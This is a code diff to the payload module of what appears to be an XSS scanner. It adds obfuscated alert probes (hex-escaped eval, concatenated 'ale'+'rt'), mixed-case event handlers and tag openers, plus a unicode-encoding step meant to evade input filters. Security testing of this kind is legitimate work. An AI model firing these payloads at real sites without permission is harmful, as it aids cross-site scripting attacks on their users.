@@ -49,7 +49,7 @@ def keyword_init():
                          "window['ale'+'rt'](591)",
                          "window['ale'%2b'rt'](591)",
                          "window['ale'%252b'rt'](591)",
-                         "eval(591)"
+                         'eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29")'
                          ]
 
     keyword['onevent'] = ["oNwHeEl=591",
@@ -60,16 +60,20 @@ def keyword_init():
                           "oNloAd=591", # <body onload=alert(1)>
                           "oNErrOr=591",
                           "SrC=591",
+                          "oNToGgle=591",
                           # "eval(\""+''.join((r'\x%2x'%ord(c)for c in 'alert(591)'))+"\")", 会报错：bad escape \x at position 6，查询了下貌似是 python3 的问题
                           # eval("\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29 \"), #这个动作可以和 onerror 搭配使用
                           "HReF=jAvAScRipt:591",
                           "AcCESsKeY=591"]  # <A HReF=jAvAScRipt:591>aaaa</a>
-    keyword['tag'] = ["<IfrAme>591</IfrAme>",
-                      "<A>591</A>",
+    keyword['tag'] = ["<A>591</A>",
                       "<ScRipt>591</ScRipt>",
-                      "<iNpUt>591",
-                      "<BoDy>591",
-                      "<ImG>591"
+                      "<IfrAme 591",
+                      "<iNpUt 591",
+                      "<BoDy 591",
+                      "<ImG 591",
+                      "<DeTaIlS 591",
+                      "<SvG 591",
+                      "<SEleCt 591","<video><source 591","<audio 591","<textarea 591"
                       ]
 
     keyword['others'] = [
@@ -99,9 +103,8 @@ def keyword_init():
     keyword['combination_close_yes'] = [
 
     ]
-    payload2unicode()
-    # [print(e) for e in keyword]
 
+    payload2unicode()
 
 def keyword_(key):
     global keyword
@@ -124,11 +127,7 @@ def keyword_(key):
     while key == "\"'>":
         newlist = ["\"'>" + i for i in keyword]
         keyword = newlist
-        # [print(e) for e in keyword]
         break
-
-    # def keyword_add_clog(self):
-
 
 
 # 将 action[]中每个 payload 中的字母转换为 unicode 码 ———— 支持弹窗函数的 unicode 编码绕过方法
@@ -144,7 +143,6 @@ def payload2unicode():
                 s2+=hex(ord(s)).replace("0x", "\\u00")
             else:
                 s2+=s
-        # print(s2)
         keyword['action'].append(s2)
 
 
